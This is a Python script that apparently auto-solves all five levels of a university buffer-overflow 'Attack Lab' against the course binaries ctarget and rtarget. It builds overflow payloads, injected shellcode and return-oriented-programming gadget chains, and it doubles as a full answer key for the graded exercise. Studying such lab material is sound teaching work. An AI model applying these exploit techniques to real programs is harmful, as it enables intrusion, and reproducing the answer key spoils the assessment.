# imports:
from struct import pack # convert int to bytes.
import os

# get buf size:
gdb_output = os.popen('(echo  "disassemble getbuf\n") | gdb ctarget -q').read()
buffsize = int(gdb_output[gdb_output.find(',%rsp')-2:][:2], 16)

# get cookie:
cookie = int(open('cookie.txt').read()[2:], 16)

# get touch1, touch2 and touch3 addresses:
touch1 = int(os.popen("objdump -t ctarget | grep touch1").read().split(' ')[0], 16)
touch2 = int(os.popen("objdump -t ctarget | grep touch2").read().split(' ')[0], 16)
touch3 = int(os.popen("objdump -t ctarget | grep touch3").read().split(' ')[0], 16)


# 1. 
print('Solving level 1...')
print('')

level1 = (buffsize * 'A').encode() + pack('<I', touch1)
open('level1input', 'wb').write(level1)
os.system("./ctarget < level1input")

print()

# 2.
print('Solving level 2...')
print('')

# finding buff - the buffer we read into , address:
open('fake.txt', 'w').write('AAAAAAAA')
gdb_output = os.popen('(echo  "b *getbuf+12\nr < fake.txt\nx \$esp\nq\ny\n") | gdb ctarget -q').read()
buff = int(gdb_output[gdb_output.find('0x41414141') - 10:][:8], 16)

val = cookie
shellcode_bytes = b'\x5f\xc3' # pop rdi, ret

level2 = shellcode_bytes + ((buffsize - len(shellcode_bytes)) * 'A').encode() + pack('<Q', buff) + pack('<Q', val) + pack('<Q', touch2)
open('level2input', 'wb').write(level2)
os.system("./ctarget < level2input")

print()


# 3.
print('Solving level 3...')
print('')

# finding buff - the buffer we read into , address:
open('fake.txt', 'w').write('AAAAAAAA')
gdb_output = os.popen('(echo  "b *getbuf+12\nr < fake.txt\nx \$esp\nq\ny\n") | gdb ctarget -q').read()
buff = int(gdb_output[gdb_output.find('0x41414141') - 10:][:8], 16)

shellcode_bytes = b'\x5f\xc3'
val = buff + buffsize + 3 * 8 # cookie_str_ptr

level3 = shellcode_bytes + ((buffsize - len(shellcode_bytes)) * 'A').encode() + pack('<Q', buff) + pack('<Q', val) + pack('<Q', touch3) + str(hex(cookie)[2:]).encode()
open('level3input', 'wb').write(level3)
os.system("./ctarget < level3input")

print()

# 4.
print('Solving level 4...')
print('')

val = cookie

init_in_file = open('rtarget', 'rb').read().find(b'\x48\x83\xec\x08') - 4 # find init function start offset at file.
init_address = int(os.popen("objdump -t rtarget | grep .init").read().split(' ')[0], 16) -  4 # find init function address at memory.

gadget1_offset = open('rtarget', 'rb').read().find(b'\x58\xc3') # pop rax; ret;
gadget2_offset = open('rtarget', 'rb').read().find(b'\x48\x89\xc7\xc3') # mov rax, rsi; ret;

gadget1_address =  init_address + gadget1_offset - init_in_file
gadget2_address =  init_address + gadget2_offset - init_in_file

level4 = (buffsize * 'A').encode() + pack('<Q', gadget1_address) + pack('<Q', val) + pack('<Q', gadget2_address) + pack('<Q', touch2)
open('level4input', 'wb').write(level4)
os.system("./rtarget < level4input")

print()

# 5.

print('Solving level 5...')
print('')

init_in_file = open('rtarget', 'rb').read().find(b'\x48\x83\xec\x08') - 4 # find init function start offset at file.
init_address = int(os.popen("objdump -t rtarget | grep .init").read().split(' ')[0], 16) -  4 # find init function address at memory.

gadgets_code = [
  b"\x48\x89\xe0", # mov rsp, rax;
  b"\x48\x89\xc7", # mov rax, rdi;
  b"\x58", # pop rax;
  b"\x89\xc2\x18\xc0", # mov eax, edx;
  b"\x89\xd1", # mov edx, ecx;
  b"\x89\xce\x00\xd2", # mov ecx, esi;
  b"\x48\x8d\x04\x37", # lea (rdi, rsi, 1), rax;
  b"\x48\x89\xc7" # mov rax, rdi;
]
gadgets_offsets = [open('rtarget', 'rb').read().find(code + b"\xc3") for code in gadgets_code]
if any([g == -1 for g in gadgets_offsets]):
    print('one of gadgets not found')
    
else:
    adrs = [init_address + gadget_offset - init_in_file for gadget_offset in gadgets_offsets]
    offset = 8 + len(gadgets_code) * 8

    level5 = (buffsize * 'A').encode() + pack('<Q', adrs[0]) + pack('<Q', adrs[1]) + pack('<Q', adrs[2]) + pack('<Q', offset) + pack('<Q', adrs[3]) + pack('<Q', adrs[4]) + pack('<Q', adrs[5]) + pack('<Q', adrs[6]) + pack('<Q', adrs[7]) + pack('<Q', touch3) + hex(cookie)[2:].encode() 
    open('level5input', 'wb').write(level5)
    os.system("./rtarget < level5input")

print()

